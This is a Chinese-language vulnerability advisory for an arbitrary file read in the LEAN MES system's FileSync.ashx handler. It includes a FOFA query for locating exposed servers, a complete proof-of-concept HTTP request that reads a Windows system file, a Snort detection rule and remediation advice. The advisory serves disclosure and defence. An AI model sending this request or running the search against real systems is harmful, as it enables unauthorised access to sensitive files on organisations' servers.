# 深科特LEAN MES系统 FileSync.ashx 存在任意文件读取漏洞

深科特LEAN MES系统 FileSync.ashx 存在任意文件读取漏洞，攻击者可进行文件读取，获取重要敏感配置信息。

# 影响版本

深科特LEAN MES系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"

POC/EXP：

```
POST /Handler/FileSync.ashx HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1

type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini
```

![image-20260122161655413](assets/image-20260122161655413.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"深科特LEAN MES系统 - Arbitrary File Read via FileSync.ashx";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/Handler/FileSync.ashx";
    http.header; content:"Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
    http.request_body; content:"type=DownLoad";
    http.request_body; pcre:"/sourceFileUrl=C:\\\\Windows\\\\win\\.ini/i";
    metadata:
        cve none,
        service http,
        affected_product "深科特LEAN MES系统",
        vulnerability_type "Arbitrary File Read",
        severity "high";
    classtype:web-application-attack;
    sid:1000585;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
